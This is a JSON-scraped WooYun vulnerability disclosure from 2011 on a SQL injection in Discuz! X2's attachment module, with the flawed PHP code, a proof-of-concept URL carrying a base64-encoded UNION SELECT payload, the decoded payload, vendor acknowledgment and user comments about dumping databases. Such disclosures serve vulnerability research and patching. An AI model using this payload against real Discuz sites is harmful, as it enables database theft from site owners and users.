{"id": 22470, "wybug_id": "wooyun-2011-02330", "wybug_title": "Discuz! X2 SQL注射漏洞", "wybug_corp": "Discuz!", "wybug_author": "Jannock", "wybug_date": "2011-06-28 16:49", "wybug_open_date": "2011-07-28 18:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "漏洞分析技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-06-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-06-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-07-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2011-08-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-09-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-09-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-07-28：\t细节向公众公开  简要描述： Discuz! X2 SQL注射漏洞，支持Union 详细说明：  文件：source\\module\\forum\\forum_attachment.phpif(!defined('IN_DISCUZ')) {\texit('Access Denied');}define('NOROBOT', TRUE);@list($_G['gp_aid'], $_G['gp_k'], $_G['gp_t'], $_G['gp_uid'], $_G['gp_tableid']) = explode('|', base64_decode($_G['gp_aid']));if(!empty($_G['gp_findpost']) && ($attach = DB::fetch_first(\"SELECT pid, tid FROM \".DB::table('forum_attachment').\" WHERE aid='$_G[gp_aid]'\"))) {\tdheader('location: forum.php?mod=redirect&goto=findpost&pid='.$attach['pid'].'&ptid='.$attach['tid']);}变量aid 直接base64_decode 后传入 SQL查询，造成注射漏洞。。。   漏洞证明：  http://www.discuz.net/forum.php?mod=attachment&findpost=ss&aid=MScgYW5kIDE9MiB1bmlvbiBhbGwgc2VsZWN0IDEsVEFCTEVfTkFNRSBmcm9tIElORk9STUFUSU9OX1NDSEVNQS5UQUJMRVMgd2hlcmUgVEFCTEVfU0NIRU1BPWRhdGFiYXNlKCkgYW5kICBUQUJMRV9OQU1FIGxpa2UgJyVfbWVtYmVyfHh8eHx4fHg%3Dhttp://www.discuz.net/forum.php?mod=redirect&goto=findpost&pid=1&ptid=pre_common_admincp_member暴出表名  pre_common_admincp_member 实际查询为：$x=\"1' and 1=2 union all select 1,TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=database() and  TABLE_NAME like '%_member|x|x|x|x\";die (urlencode(base64_encode($x)));   修复方案：  您懂得！   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2011-06-28 18:44 厂商回复： 感谢您的支持, 我们已经处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-06-28 17:12 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  果断是乌云排名第一    \n     2011-06-28 17:20 |    \t\t狗样的男人 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:11        )\t\t \n  求真相啊，这可是- -    \n     2011-06-28 17:26 |    \t\tLmy \t\t\t( 实习白帽子  |\t\t\t        Rank:69 漏洞数:12        | 低调求发展)\t\t \n  同求真相，传说中的DZ X2！ 最近传得沸沸扬扬的，不知道是否属实！    \n     2011-06-28 17:36 |    \t\t阿神 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 值得。)\t\t \n  不知道是不是和黑吧的那个一样额，，，NT...     \n     2011-06-28 17:39 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我觉得吧 相信Jannock神    \n     2011-06-28 19:27 |    \t\tyingzi \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:3        )\t\t \n   关注！！    \n     2011-06-28 21:09 |    \t\tnull \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:2        | 左岸是无法忘却的回忆，右岸是值得把握的青...)\t\t \n  V5.....    \n     2011-06-28 21:35 |    \t\tGaRY \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:3        | 真悲剧平男君)\t\t \n  膜拜一下    \n     2011-06-28 21:58 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  = =! 拖库拖到手抽筋~    \n     2011-06-28 21:59 |    \t\txy7 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | javascript:alert(1))\t\t \n  手抽筋啊手抽筋！    \n     2011-06-28 22:05 |    \t\txy7 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | javascript:alert(1))\t\t \n  再次膜拜一下Jannock……    \n     2011-06-29 05:13 |    \t\t顺子 \t\t\t( 普通白帽子  |\t\t\t        Rank:236 漏洞数:36        | 0-0努力像正常青年靠近，再也不当上错图的2...)\t\t \n  我去啊。威武了    \n     2011-06-29 09:02 |    \t\tP w \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:14        | -这家伙很懒,什么都没有留下。其实我真的很...)\t\t \n  手抽筋啊./    \n     2011-06-29 11:02 |    \t\t薄雾ing \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:4        | 写点什么呢？还处于学习阶段。期待与更多业...)\t\t \n  V5    \n     2011-06-29 11:36 |    \t\trootsecurity \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:20        | 关注开源，关注网络安全！INSERT INTO `w...)\t\t \n  有库脱了。    \n     2011-06-29 15:13 |    \t\t酱油哥 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:3        | 打酱油。)\t\t \n  裤子要脱很长时间，脱到蛋疼。    \n     2011-06-29 15:23 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  ToolS也有了 这样直接发布不太好    \n     2011-06-29 15:43 |    \t\tsaga \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 世界上只有10种人，懂二进制的，和不懂二进...)\t\t \n  据说不止这一个啊，继续关注！    \n     2011-06-30 19:31 |    \t\tSnow陈伦 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 闷骚的家伙，何处都是你的战场。)\t\t \n  路过。外传了就不好了    \n     2012-11-04 19:28 |    \t\tslls124 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 新手)\t\t \n  牛X    \n     2014-07-25 14:09 |    \t\tVigoss_Z \t\t\t( 普通白帽子  |\t\t\t        Rank:404 漏洞数:63        | 楞娃)\t\t \n  当年的0day，现在应该是10000的节奏    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}